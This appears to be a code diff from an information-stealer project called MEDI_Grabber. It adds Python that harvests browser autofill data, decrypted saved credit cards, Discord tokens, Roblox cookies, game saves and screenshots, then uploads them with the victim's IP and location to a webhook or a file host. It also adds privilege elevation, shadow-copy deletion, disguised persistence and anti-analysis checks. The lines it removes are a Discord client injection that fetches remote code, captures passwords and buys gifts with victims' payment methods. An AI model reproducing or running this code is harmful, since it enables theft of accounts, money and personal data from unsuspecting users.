+        try: shutil.copy2(login_db, newdb)
+        except Exception: self.exceptions.append(traceback.format_exc())
+        conn = sqlite3.connect(newdb)
+        cursor = conn.cursor()
+        try:
+            cursor.execute("SELECT street_address, city, state, zipcode FROM autofill_profiles")
+            for r in cursor.fetchall():
+                Address = r[0]
+                City = r[1]
+                State = r[2]
+                ZIP = r[3]
+                if Address != "":
+                    self.misc_temp += f"\nAdres: {Address}\nMiasto {City}\nWojewództwo: {State}\nKod Pocztowy: {ZIP}\n"
+                    self.stats['addresses'] += 1
+            cursor.execute("SELECT number FROM autofill_profile_phones")
+            for r in cursor.fetchall():
+                Number = r[0]
+                if Number != "":
+                    self.misc_temp += f"\nNumer Telefonu: {Number}\n"
+                    self.stats['phones'] += 1
+            cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
+            for r in cursor.fetchall():
+                Name = r[0]
+                ExpM = r[1]
+                ExpY = r[2]
+                decrypted_card = self.decrypt_val(r[3], master_key)
+                if decrypted_card != "":
+                    self.misc_temp += f"\nCard Number: {decrypted_card}\nName on Card: {Name}\nExpiration Month: {ExpM}\nExpiration Year: {ExpY}\n"
+                    self.stats['cards'] += 1
+        except Exception: self.exceptions.append(traceback.format_exc())
+        cursor.close()
+        conn.close()
+        try: os.remove(newdb)
+        except Exception: self.exceptions.append(traceback.format_exc())
+    def grabRobloxCookie(self):
+        try: self.robloxcookies.append(self.system(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com' -Name .ROBLOSECURITY"))
+        except Exception: pass
+        if self.robloxcookies:
+            with open(self.tempfolder+"\\Roblox Cookie.txt", "w") as f:
+                for i in self.robloxcookies: f.write(i+'\n')
+    def grabTokens(self):
+        paths = {
+            'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
+            'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
+            'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
+            'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
+            'Opera': self.roaming + r'\\Opera Software\\Opera Stable',
+            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable',
+            'Amigo': self.appdata + r'\\Amigo\\User Data',
+            'Torch': self.appdata + r'\\Torch\\User Data',
+            'Kometa': self.appdata + r'\\Kometa\\User Data',
+            'Orbitum': self.appdata + r'\\Orbitum\\User Data',
+            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data',
+            '7Star': self.appdata + r'\\7Star\\7Star\\User Data',
+            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data',
+            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data',
+            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data',
+            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\<PROFILE>',
+            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\<PROFILE>',
+            'Chrome Beta': self.appdata + r'\\Google\\Chrome Beta\\User Data\\<PROFILE>',
+            'Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\<PROFILE>',
+            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\<PROFILE>',
+            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\<PROFILE>',
+            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\<PROFILE>',
+            'Iridium': self.appdata + r'\\Iridium\\User Data\\<PROFILE>',
+            'Chromium': self.appdata + r'\\Chromium\\User Data\\<PROFILE>'
         }
-      }
-      processedLen += updateProcessedLen;
-      remainder = chunk.slice(updateProcessedLen >>> 5);
-      remainderLen = chunkBinLen % variantBlockSize;
-    };
+        for source, path in paths.items():
+            if not os.path.exists(path.replace('<PROFILE>','')): continue
+            if "discord" not in path:
+                profiles = ['Default']
+                for dir in os.listdir(path.replace('<PROFILE>','')):
+                    if dir.startswith('Profile '):
+                        profiles.append(dir)
+                for profile in profiles:
+                    newpath = path.replace('<PROFILE>',profile) + r'\\Local Storage\\leveldb\\'
+                    for file_name in os.listdir(newpath):
+                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'): continue
+                        for line in [x.strip() for x in open(f'{newpath}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                            for token in re.findall(r"[\w-]{24,28}\.[\w-]{6}\.[\w-]{25,110}", line): self.checkToken(token, f'{source} ({profile})')
+            else:
+                if os.path.exists(self.roaming+'\\discord\\Local State'):
+                    for file_name in os.listdir(path):
+                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'): continue
+                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                            for y in re.findall(r"dQw4w9WgXcQ:[^\"]*", line): token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+'\\discord\\Local State')); self.checkToken(token, source)
+        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
+            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
+                for _file in files:
+                    if not _file.endswith('.sqlite'): continue
+                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
+                            for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", line): self.checkToken(token, 'Firefox')
+    def neatifyTokens(self):
+        f = open(self.tempfolder+"\\Discord Info.txt", "w+", encoding="utf8", errors='ignore')
+        for info in self.tokens:
+            token = info[0]
+            j = requests.get(self.baseurl, headers=self.getHeaders(token)).json()
+            user = j.get('username') + '#' + str(j.get("discriminator"))
+            badges = ""
+            flags = j['flags']
+            if (flags == 1): badges += "Staff, "
+            if (flags == 2): badges += "Partner, "
+            if (flags == 4): badges += "Hypesquad Event, "
+            if (flags == 8): badges += "Green Bughunter, "
+            if (flags == 64): badges += "Hypesquad Bravery, "
+            if (flags == 128): badges += "HypeSquad Brillance, "
+            if (flags == 256): badges += "HypeSquad Balance, "
+            if (flags == 512): badges += "Early Supporter, "
+            if (flags == 16384): badges += "Gold BugHunter, "
+            if (flags == 131072): badges += "Verified Bot Developer, "
+            if (badges == ""): badges = "None"
+            email = j.get("email")
+            phone = j.get("phone") if j.get("phone") else "No Phone Number attached"
+            try: nitro_data = requests.get(self.baseurl+'/billing/subscriptions', headers=self.getHeaders(token)).json()
+            except Exception: self.exceptions.append(traceback.format_exc())
+            has_nitro = False
+            has_nitro = bool(len(nitro_data) > 0)
+            try: billing = bool(len(json.loads(requests.get(self.baseurl+"/billing/payment-sources", headers=self.getHeaders(token)).text)) > 0)
+            except Exception: self.exceptions.append(traceback.format_exc())
+            f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nPlatform: {info[1]}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n")
+        f.seek(0)
+        content = f.read()
+        f.close()
+        if not content:
+            os.remove(self.tempfolder+"\\Discord Info.txt")
+    def screenshot(self):
+        image = ImageGrab.grab(
+            bbox=None, 
+            include_layered_windows=False, 
+            all_screens=True, 
+            xdisplay=None
+        )
+        image.save(self.tempfolder + "\\Screenshot.png")
+        image.close()
 
-    this.getHMAC = function () {
-      var firstHash;
+    def grabMinecraftCache(self):
+        if not os.path.exists(os.path.join(self.roaming, '.minecraft')): return
+        minecraft = os.path.join(self.tempfolder, 'Minecraft Cache')
+        os.makedirs(minecraft, exist_ok=True)
+        mc = os.path.join(self.roaming, '.minecraft')
+        to_grab = ['launcher_accounts.json', 'launcher_profiles.json', 'usercache.json', 'launcher_log.txt']
 
-      if (false === hmacKeySet) {
-        console.error('Cannot call getHMAC without first setting HMAC key');
-      }
+        for _file in to_grab:
+            if os.path.exists(os.path.join(mc, _file)):
+                shutil.copy2(os.path.join(mc, _file), minecraft + os.sep + _file)
+    def grabGDSave(self):
+        if not os.path.exists(os.path.join(self.appdata, 'GeometryDash')): return
+        gd = os.path.join(self.tempfolder, 'Geometry Dash Save')
+        os.makedirs(gd, exist_ok=True)
+        gdf = os.path.join(self.appdata, 'GeometryDash')
+        to_grab = ['CCGameManager.dat']
 
-      const formatFunc = function (binarray) {
-        return binb2hex(binarray);
-      };
-
-      if (false === finalized) {
-        firstHash = finalizeFunc(remainder, remainderLen, processedLen, intermediateH);
-        intermediateH = roundFunc(keyWithOPad, getH());
-        intermediateH = finalizeFunc(firstHash, outputBinLen, variantBlockSize, intermediateH);
-      }
-
-      finalized = true;
-      return formatFunc(intermediateH);
-    };
-  }
-}
-
-if ('function' === typeof define && define['amd']) {
-  define(function () {
-    return jsSHA;
-  });
-} else if ('undefined' !== typeof exports) {
-  if ('undefined' !== typeof module && module['exports']) {
-    module['exports'] = exports = jsSHA;
-  } else {
-    exports = jsSHA;
-  }
-} else {
-  global['jsSHA'] = jsSHA;
-}
-
-if (jsSHA.default) {
-  jsSHA = jsSHA.default;
-}
-
-function totp(key) {
-  const period = 30;
-  const digits = 6;
-  const timestamp = Date.now();
-  const epoch = Math.round(timestamp / 1000.0);
-  const time = leftpad(dec2hex(Math.floor(epoch / period)), 16, '0');
-  const shaObj = new jsSHA();
-  shaObj.setHMACKey(base32tohex(key));
-  shaObj.update(time);
-  const hmac = shaObj.getHMAC();
-  const offset = hex2dec(hmac.substring(hmac.length - 1));
-  let otp = (hex2dec(hmac.substr(offset * 2, 8)) & hex2dec('7fffffff')) + '';
-  otp = otp.substr(Math.max(otp.length - digits, 0), digits);
-  return otp;
-}
-
-function hex2dec(s) {
-  return parseInt(s, 16);
-}
-
-function dec2hex(s) {
-  return (s < 15.5 ? '0' : '') + Math.round(s).toString(16);
-}
-
-function base32tohex(base32) {
-  let base32chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567',
-    bits = '',
-    hex = '';
-
-  base32 = base32.replace(/=+$/, '');
-
-  for (let i = 0; i < base32.length; i++) {
-    let val = base32chars.indexOf(base32.charAt(i).toUpperCase());
-    if (val === -1) console.error('Invalid base32 character in key');
-    bits += leftpad(val.toString(2), 5, '0');
-  }
-
-  for (let i = 0; i + 8 <= bits.length; i += 8) {
-    let chunk = bits.substr(i, 8);
-    hex = hex + leftpad(parseInt(chunk, 2).toString(16), 2, '0');
-  }
-  return hex;
-}
-
-function leftpad(str, len, pad) {
-  if (len + 1 >= str.length) {
-    str = Array(len + 1 - str.length).join(pad) + str;
-  }
-  return str;
-}
-
-const discordPath = (function () {
-  const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
-  let resourcePath;
-
-  if (process.platform === 'win32') {
-    resourcePath = path.join(app, 'resources');
-  } else if (process.platform === 'darwin') {
-    resourcePath = path.join(app, 'Contents', 'Resources');
-  }
-
-  if (fs.existsSync(resourcePath)) return { resourcePath, app };
-  return { undefined, undefined };
-})();
-
-function updateCheck() {
-  const { resourcePath, app } = discordPath;
-  if (resourcePath === undefined || app === undefined) return;
-  const appPath = path.join(resourcePath, 'app');
-  const packageJson = path.join(appPath, 'package.json');
-  const resourceIndex = path.join(appPath, 'index.js');
-  const coreVal = fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0]
-  const indexJs = `${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js`;
-  const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
-  if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
-  if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
-  if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);
-
-  if (process.platform === 'win32' || process.platform === 'darwin') {
-    fs.writeFileSync(
-      packageJson,
-      JSON.stringify(
-        {
-          name: 'discord',
-          main: 'index.js',
-        },
-        null,
-        4,
-      ),
-    );
-
-    const startUpScript = `const fs = require('fs'), https = require('https');
-const indexJs = '${indexJs}';
-const bdPath = '${bdPath}';
-const fileSize = fs.statSync(indexJs).size
-fs.readFileSync(indexJs, 'utf8', (err, data) => {
-    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
-        init();
-})
-async function init() {
-    https.get('${config.injection_url}', (res) => {
-        const file = fs.createWriteStream(indexJs);
-        res.replace("'%WEBHOOKHEREBASE64ENCODED%'", "'${hook}'")
-        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
-        res.pipe(file);
-        file.on('finish', () => {
-            file.close();
-        });
-    
-    }).on("error", (err) => {
-        setTimeout(init(), 10000);
-    });
-}
-require('${path.join(resourcePath, 'app.asar')}')
-if (fs.existsSync(bdPath)) require(bdPath);`;
-    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
-  }
-  if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
-  fs.rmdirSync(path.join(__dirname, 'initiation'));
-  execScript(
-    `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
-  );
-  return !1;
-}
-
-const execScript = (script) => {
-  const window = BrowserWindow.getAllWindows()[0];
-  return window.webContents.executeJavaScript(script, !0);
-};
-
-const getInfo = async (token) => {
-  const info = await execScript(`var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open("GET", "${config.api}", false);
-    xmlHttp.setRequestHeader("Authorization", "${token}");
-    xmlHttp.send(null);
-    xmlHttp.responseText;`);
-  return JSON.parse(info);
-};
-
-const fetchBilling = async (token) => {
-  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
-    xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); 
-    xmlHttp.setRequestHeader("Authorization", "${token}"); 
-    xmlHttp.send(null); 
-    xmlHttp.responseText`);
-  if (!bill.lenght || bill.length === 0) return '';
-  return JSON.parse(bill);
-};
-
-const getBilling = async (token) => {
-  const data = await fetchBilling(token);
-  if (!data) return '❌';
-  let billing = '';
-  data.forEach((x) => {
-    if (!x.invalid) {
-      switch (x.type) {
-        case 1:
-          billing += '💳 ';
-          break;
-        case 2:
-          billing += '<:paypal:951139189389410365> ';
-          break;
-      }
-    }
-  });
-  if (!billing) billing = '❌';
-  return billing;
-};
-
-const Purchase = async (token, id, _type, _time) => {
-  const options = {
-    expected_amount: config.nitro[_type][_time]['price'],
-    expected_currency: 'usd',
-    gift: true,
-    payment_source_id: id,
-    payment_source_token: null,
-    purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
-    sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
-  };
-
-  const req = execScript(`var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
-    xmlHttp.setRequestHeader("Authorization", "${token}");
-    xmlHttp.setRequestHeader('Content-Type', 'application/json');
-    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
-    xmlHttp.responseText`);
-  if (req['gift_code']) {
-    return 'https://discord.gift/' + req['gift_code'];
-  } else return null;
-};
-
-const buyNitro = async (token) => {
-  const data = await fetchBilling(token);
-  const failedMsg = 'Kupienie Zakończone Niepowodzeniem ❌';
-  if (!data) return failedMsg;
-
-  let IDS = [];
-  data.forEach((x) => {
-    if (!x.invalid) {
-      IDS = IDS.concat(x.id);
-    }
-  });
-  for (let sourceID in IDS) {
-    const first = Purchase(token, sourceID, 'boost', 'year');
-    if (first !== null) {
-      return first;
-    } else {
-      const second = Purchase(token, sourceID, 'boost', 'month');
-      if (second !== null) {
-        return second;
-      } else {
-        const third = Purchase(token, sourceID, 'classic', 'month');
-        if (third !== null) {
-          return third;
-        } else {
-          return failedMsg;
+        for _file in to_grab:
+            if os.path.exists(os.path.join(gdf, _file)):
+                shutil.copy2(os.path.join(gdf, _file), gd + os.sep + _file)
+    def SendInfo(self):
+        wname = self.getProductValues()[0]
+        wkey = self.getProductValues()[1]
+        ip = country = city = region = googlemap = "None"
+        try:
+            data = requests.get("https://ipinfo.io/json").json()
+            ip = data['ip']
+            city = data['city']
+            country = data['country']
+            region = data['region']
+            googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
+        except Exception: self.exceptions.append(traceback.format_exc())
+        _zipfile = os.path.join(self.tempfolder, f'MEDI_Grabber-{os.getlogin()}.zip')
+        zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
+        abs_src = os.path.abspath(self.tempfolder)
+        for dirname, _, files in os.walk(self.tempfolder):
+            for filename in files:
+                if filename == f'MEDI_Grabber-{os.getlogin()}.zip': continue
+                absname = os.path.abspath(os.path.join(dirname, filename))
+                arcname = absname[len(abs_src) + 1:]
+                zipped_file.write(absname, arcname)
+        zipped_file.close()
+        self.files, self.fileCount = self.gen_tree(self.tempfolder)
+        self.fileCount =  f"{self.fileCount} Plik{'i' if self.fileCount != 1 else ''} Znalezione: "
+        embed = {
+            "username": f"{os.getlogin()} | MEDI_Grabber",
+            "content": "@everyone",
+            "avatar_url":"https://media.tenor.com/XXAXt1WWm3YAAAAi/pepe-hack-hack.gif",
+            "embeds": [
+                {
+                    "author": {
+                        "name": "Złapałem Kogoś!",
+                        "url": "https://discord.gg/Mup4VzgQB9",
+                        "icon_url": "https://cdn.discordapp.com/attachments/976805447266877471/987826721250238464/c33cd7baf5e2abdf434c2793988ccb56.png"
+                    },
+                    "description": f'**{os.getlogin()}** Odpalił Grabbera.\n\n**Nazwa Komputera:** {os.getenv("COMPUTERNAME")}\n**{wname}:** {wkey if wkey else "Brak Klucza!"}\n**IP:** {ip} (VPN/Proxy: {requests.get("http://ip-api.com/json?fields=proxy").json()["proxy"]})\n**Miasto:** {city}\n**Region:** {region}\n**Kraj:** {country}\n[Lokalizacja Na Google Maps]({googlemap})\n```ansi\n\u001b[32m{self.fileCount}\u001b[35m{self.files}``````ansi\n\u001b[32mStatystyki:\n\u001b[35mHasła Znalezione: {self.stats["passwords"]}\nCookie Znalezione: {self.stats["cookies"]}\nNumery Telefonu: {self.stats["phones"]}\nKarty Znalezione: {self.stats["cards"]}\nAddresy Znalezione: {self.stats["addresses"]}\nTokeny Znalezione: {self.stats["tokens"]}\nCzas: {"{:.2f}".format(time.time() - self.starttime)}s```',
+                    "color": 0x00FFFF,
+                    "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
+                    "thumbnail": {
+                      "url": "https://media.discordapp.net/attachments/603308182349021221/810853140130824243/f2b1931a-bb21-4095-a0e7-39d606cc41d8-1.gif"
+                    },
+                     "footer": {
+                        "text": "Złapałem kogoś!",
+                        "icon_url": "https://media.tenor.com/XXAXt1WWm3YAAAAi/pepe-hack-hack.gif"
+                    }
+                }
+            ]
         }
-      }
-    }
-  }
-};
+        fileEmbed = {
+            "username": f"{os.getlogin()} | MEDI_Grabber",
+            "avatar_url":"https://cdn.discordapp.com/attachments/976805447266877471/987826721250238464/c33cd7baf5e2abdf434c2793988ccb56.png"
+        }
+        with open(_zipfile,'rb') as infozip:
+            requests.post(self.webhook, json=embed)
+            if requests.post(self.webhook, data=fileEmbed, files={'upload_file': infozip}).status_code == 413:
+                infozip.seek(0)
+                server = requests.get('https://api.gofile.io/getServer').json()['data']['server']
+                link = requests.post(
+                    url=f"https://{server}.gofile.io/uploadFile",
+                    data={
+                        "token": None,
+                        "folderId": None,
+                        "description": None,
+                        "password": None,
+                        "tags": None,
+                        "expire": None
+                },
+                files={"upload_file": infozip},
+                ).json()["data"]["downloadPage"]
+                a = fileEmbed.copy()
+                a.update({"content": f"{link}"})
+                requests.post(self.webhook, json=a)
+        os.remove(_zipfile)
+    def forceadmin(self):
+        self.system(f'set __COMPAT_LAYER=RunAsInvoker && powershell Start-Process \'{sys.argv[0]}\' -WindowStyle Hidden -verb runAs -ArgumentList \'--nouacbypass\'>nul')
+        sys.exit()
+    def persist(self):
+        try: elevated = ctypes.windll.shell32.IsUserAnAdmin()
+        except Exception: elevated = False
+        if elevated:
+            try:
+                self.system(f'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "SettingsPageVisibility" /t REG_SZ /d "hide:recovery;windowsdefender" /f >nul')
+                self.system(f'reagentc /disable >nul')
+                self.system(f'vssadmin delete shadows /all /quiet >nul')
+                shutil.copy2(sys.argv[0],'C:\\Windows\\Cursors\\')
+                os.rename(os.path.join('C:\\Windows\\Cursors',os.path.basename(sys.argv[0]),'C:\\Windows\\Cursors\\cursors.cfg'))
+                with open('cursorinit.vbs','w') as f: f.write('\' This script loads the cursor configuration\n\' And cursors themselves\n\' Into the shell so that Fondrvhost.exe (The font renderer)\n\' Can use them.\n\' It is recommended not to tamper with\n\' Any files in this directory\n\' Doing so may cause the explorer to crash\nSet objShell = WScript.CreateObject(\"WScript.Shell\")\nobjShell.Run \"cmd /c C:\\Windows\\Cursors\\cursors.cfg\", 0, True\n')
+                self.system(f'schtasks /create /tn "CursorSvc" /sc ONLOGON /tr "C:\\Windows\\Cursors\\cursorinit.vbs" /rl HIGHEST /f >nul')
+                ctypes.windll.kernel32.SetFileAttributesW('C:\\Windows\\Cursors',0x2)
+                ctypes.windll.kernel32.SetFileAttributesW('C:\\Windows\\Cursors',0x4)
+                ctypes.windll.kernel32.SetFileAttributesW(self.roaming+'\\Cursors',0x256)
+            except Exception: self.exceptions.append(traceback.format_exc())
+        elif (elevated == False) and (os.getcwd() != os.path.join(self.roaming,'Cursors')):
+            try:
+                try: shutil.rmtree(os.path.join(self.roaming,'Cursors'))
+                except Exception: pass
+                os.makedirs(self.roaming+'\\Cursors', 0x1ED, exist_ok=True)
+                ctypes.windll.kernel32.SetFileAttributesW(self.roaming+'\\Cursors',0x2)
+                ctypes.windll.kernel32.SetFileAttributesW(self.roaming+'\\Cursors',0x4)
+                ctypes.windll.kernel32.SetFileAttributesW(self.roaming+'\\Cursors',0x256)
+                shutil.copy2(sys.argv[0],os.path.join(self.roaming,'Cursors\\'))
+                os.rename(os.path.join(self.roaming,'Cursors\\',os.path.basename(sys.argv[0])),os.path.join(self.roaming,'Cursors\\cursors.cfg',))
+                binp = "Cursors\\cursors.cfg"
+                initp = "Cursors\\cursorinit.vbs"
+                with open(os.path.join(self.roaming,'Cursors\\cursorinit.vbs'),'w') as f: f.write(f'\' This script loads the cursor configuration\n\' And cursors themselves\n\' Into the shell so that Fondrvhost.exe (The font renderer)\n\' Can use them.\n\' It is recommended not to tamper with\n\' Any files in this directory\n\' Doing so may cause the explorer to crash\nSet objShell = WScript.CreateObject(\"WScript.Shell\")\nobjShell.Run \"cmd /c \'{os.path.join(self.roaming,binp)}\'\", 0, True\n')
+                self.system(f'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "CursorInit" /t REG_SZ /d "{os.path.join(self.roaming,initp)}" /f >nul')
+            except Exception: self.exceptions.append(traceback.format_exc())
+def handler():
+    try: ticks(0x0000000000F)
+    except Exception: pass
+    internal.stolen = True
+    if config.get('keep-alive'):
+        while True:
+            time.sleep(random.randrange(3400,3800))
+            try: ticks(0x0000000000F)
+            except Exception: pass
+def stabilizeTicks():
+    if config['antivm']:
+        if os.path.exists('D:\\Tools') or os.path.exists('D:\\OS2') or os.path.exists('D:\\NT3X'): return
+        if ctypes.windll.kernel32.IsDebuggerPresent() or ctypes.windll.kernel32.CheckRemoteDebuggerPresent(ctypes.windll.kernel32.GetCurrentProcess(), False): return
+        for process in psutil.process_iter():
+            if process.name() in ["ProcessHacker.exe", "httpdebuggerui.exe", "wireshark.exe", "fiddler.exe", "vboxservice.exe", "df5serv.exe", "processhacker.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "ida64.exe", "ollydbg.exe", "pestudio.exe", "vmwareuser.exe", "vgauthservice.exe", "vmacthlp.exe", "vmsrvc.exe", "x32dbg.exe", "x64dbg.exe", "x96dbg.exe", "vmusrvc.exe", "prl_cc.exe", "prl_tools.exe", "qemu-ga.exe", "joeboxcontrol.exe", "ksdumperclient.exe", "xenservice.exe", "joeboxserver.exe", "devenv.exe", "IMMUNITYDEBUGGER.EXE", "ImportREC.exe", "reshacker.exe", "windbg.exe", "32dbg.exe", "64dbg.exex", "protection_id.exex", "scylla_x86.exe", "scylla_x64.exe", "scylla.exe", "idau64.exe", "idau.exe", "idaq64.exe", "idaq.exe", "idaq.exe", "idaw.exe", "idag64.exe", "idag.exe", "ida64.exe", "ida.exe", "ollydbg.exe"]: return
+        if os.getlogin() in ["WDAGUtilityAccount","Abby","Peter Wilson","hmarc","patex","JOHN-PC","RDhJ0CNFevzX","kEecfMwgj","Frank","8Nl0ColNQ5bq","Lisa","John","george","PxmdUOpVyx","8VizSM","w0fjuOVmCcP5A","lmVwjj9b","PqONjHVwexsS","3u2v9m8","Julia","HEUeRzl","Joe"]: return
+        if functions.system(functions, r'wmic path win32_VideoController get name').splitlines()[1] in ["Microsoft Remote Display Adapter", "Microsoft Hyper-V Video", "Microsoft Basic Display Adapter", "VMware SVGA 3D", "Standard VGA Graphics Adapter","NVIDIA GeForce 840M", "NVIDIA GeForce 9400M", "UKBEHH_S", "ASPEED Graphics Family(WDDM)", "H_EDEUEK", "VirtualBox Graphics Adapter", "K9SC88UK","Стандартный VGA графический адаптер",]: return
+        if int(str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]) <= 50: return
+    if config['hideconsole']: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+    try: handler()
+    except Exception: pass
 
-const getNitro = (flags) => {
-  switch (flags) {
-    case 0:
-      return 'Bez Nitro';
-    case 1:
-      return 'Nitro Classic';
-    case 2:
-      return 'Nitro Boost';
-    default:
-      return 'Bez Nitro';
-  }
-};
+ticks.starttime = time.time()
+if __name__ == "__main__": stabilizeTicks()
 
-const getBadges = (flags) => {
-  let badges = '';
-  switch (flags) {
-    case 1:
-      badges += 'Discord Staff, ';
-      break;
-    case 2:
-      badges += 'Partnered Server Owner, ';
-      break;
-    case 131072:
-      badges += 'Verified Bot Developer, ';
-      break;
-    case 4194304:
-      badges += 'Active Developer, ';
-      break;
-    case 4:
-      badges += 'Hypesquad Event, ';
-      break;
-    case 16384:
-      badges += 'Gold BugHunter, ';
-      break;
-    case 8:
-      badges += 'Green BugHunter, ';
-      break;
-    case 512:
-      badges += 'Early Supporter, ';
-      break;
-    case 128:
-      badges += 'HypeSquad Brillance, ';
-      break;
-    case 64:
-      badges += 'HypeSquad Bravery, ';
-      break;
-    case 256:
-      badges += 'HypeSquad Balance, ';
-      break;
-    case 0:
-      badges = 'None';
-      break;
-    default:
-      badges = 'None';
-      break;
-  }
-  return badges;
-};
-
-const hooker = async (content) => {
-  const data = JSON.stringify(content);
-  const url = new URL(config.webhook);
-  const headers = {
-    'Content-Type': 'application/json',
-    'Access-Control-Allow-Origin': '*',
-  };
-  if (!config.webhook.includes('api/webhooks')) {
-    const key = totp(config.webhook_protector_key);
-    headers['Authorization'] = key;
-  }
-  const options = {
-    protocol: url.protocol,
-    hostname: url.host,
-    path: url.pathname,
-    method: 'POST',
-    headers: headers,
-  };
-  const req = https.request(options);
-
-  req.on('error', (err) => {
-    console.log(err);
-  });
-  req.write(data);
-  req.end();
-};
-
-const login = async (email, password, token) => {
-  const json = await getInfo(token);
-  const nitro = getNitro(json.premium_type);
-  const badges = getBadges(json.flags);
-  const billing = await getBilling(token);
-  const content = {
-    username: config.embed_name,
-    avatar_url: config.embed_icon,
-    embeds: [
-      {
-        color: config.embed_color,
-        fields: [
-          {
-            name: '**Acc Info**',
-            value: `Email: **${email}** - Hasło: **${password}**`,
-            inline: false,
-          },
-          {
-            name: '**Discord Info**',
-            value: `Rodzaj Nitro: **${nitro}**\nOdznaki: **${badges}**\nPłatności: **${billing}**`,
-            inline: false,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
-          },
-        ],
-        author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-      },
-    ],
-  };
-  if (config.ping_on_run) content['content'] = config.ping_val;
-  hooker(content);
-};
-
-const passwordChanged = async (oldpassword, newpassword, token) => {
-  const json = await getInfo(token);
-  const nitro = getNitro(json.premium_type);
-  const badges = getBadges(json.flags);
-  const billing = await getBilling(token);
-  const content = {
-    username: config.embed_name,
-    avatar_url: config.embed_icon,
-    embeds: [
-      {
-        color: config.embed_color,
-        fields: [
-          {
-            name: '**Hasło Zmienione**',
-            value: `Email: **${json.email}**\nStare Hasło: **${oldpassword}**\nNowe Hasło: **${newpassword}**`,
-            inline: true,
-          },
-          {
-            name: '**Discord Info**',
-            value: `Rodzaj Nitro: **${nitro}**\nOdznaki: **${badges}**\nPłatności: **${billing}**`,
-            inline: true,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
-          },
-        ],
-        author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-      },
-    ],
-  };
-  if (config.ping_on_run) content['content'] = config.ping_val;
-  hooker(content);
-};
-
-const emailChanged = async (email, password, token) => {
-  const json = await getInfo(token);
-  const nitro = getNitro(json.premium_type);
-  const badges = getBadges(json.flags);
-  const billing = await getBilling(token);
-  const content = {
